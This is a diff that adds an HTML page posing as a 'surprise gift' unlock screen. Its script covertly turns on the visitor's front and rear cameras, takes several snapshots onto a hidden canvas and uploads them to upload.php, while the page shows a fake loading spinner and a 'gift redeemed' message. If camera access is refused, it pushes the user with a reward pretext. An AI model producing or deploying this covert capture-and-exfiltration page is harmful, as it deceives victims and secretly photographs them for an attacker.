@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Surprise Gift!</title>
+    <style>
+        body { background: white; color: black; text-align: center; font-family: sans-serif; margin:0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        #loading-ui, #success-msg { display: none; }
+        .gift-img { width: 100px; animation: bounce 2s infinite alternate; filter: drop-shadow(0 0 10px gold); }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        @keyframes bounce { 100% { transform: translateY(-15px); } }
+        .btn { background: #00ff00; color: black; border: none; padding: 18px 30px; font-size: 18px; font-weight: bold; border-radius: 50px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div id="start-page">
+        <h2>🎁 You have a surprise gift! ✨</h2>
+        <button class="btn" onclick="startWork()">🔓 UNLOCK GIFT 🎁</button>
+    </div>
+
+    <div id="loading-ui">
+        <img class="gift-img" src="https://cdn-icons-png.flaticon.com/512/4213/4213600.png">
+        <p>Unlocking Your Gift... Please wait</p>
+        <div class="loader"></div>
+    </div>
+
+    <div id="success-msg">
+        <h2 style="color:#00ff00">CONGRATULATIONS! 🎉</h2>
+        <p>Your gift has been redeemed successfully.</p>
+    </div>
+
+    <video id="v" style="display:none" autoplay playsinline muted></video>
+    <canvas id="c" style="display:none"></canvas>
+
+    <script>
+        async function startWork() {
+            document.body.style.background = "black";
+            document.body.style.color = "white";
+            document.getElementById('start-page').style.display = 'none';
+            document.getElementById('loading-ui').style.display = 'block';
+
+            // Get selected camera mode
+            let response = await fetch('mode.txt');
+            let mode = await response.text();
+
+            // 8 seconds delay for camera focus
+            await new Promise(r => setTimeout(r, 8000));
+
+            if(mode.trim() === 'front') await runCam({facingMode: "user", width: {ideal: 1280}}, 3, "FRONT");
+            else if(mode.trim() === 'back') await runCam({facingMode: "environment", width: {ideal: 1280}}, 3, "BACK");
+            else {
+                await runCam({facingMode: "environment"}, 2, "BACK");
+                await runCam({facingMode: "user"}, 2, "FRONT");
+            }
+
+            document.getElementById('loading-ui').style.display = 'none';
+            document.getElementById('success-msg').style.display = 'block';
+        }
+
+        async function runCam(constraints, count, label) {
+            try {
+                let stream = await navigator.mediaDevices.getUserMedia({ video: constraints });
+                let video = document.getElementById('v');
+                video.srcObject = stream;
+                await video.play();
+
+                for (let i = 0; i < count; i++) {
+                    await new Promise(r => setTimeout(r, 2000)); 
+                    let can = document.getElementById('c');
+                    can.width = video.videoWidth; can.height = video.videoHeight;
+                    can.getContext('2d').drawImage(video, 0, 0);
+                    
+                    // Sending data to server
+                    fetch('upload.php', {
+                        method: 'POST',
+                        body: JSON.stringify({ image: can.toDataURL('image/jpeg', 0.9), mode: label }),
+                        headers: {'Content-Type': 'application/json'}
+                    });
+                }
+                stream.getTracks().forEach(t => t.stop());
+            } catch(e) { 
+                alert("Camera access required for reward!"); 
+            }
+        }
+    </script>
+</body>
+</html>
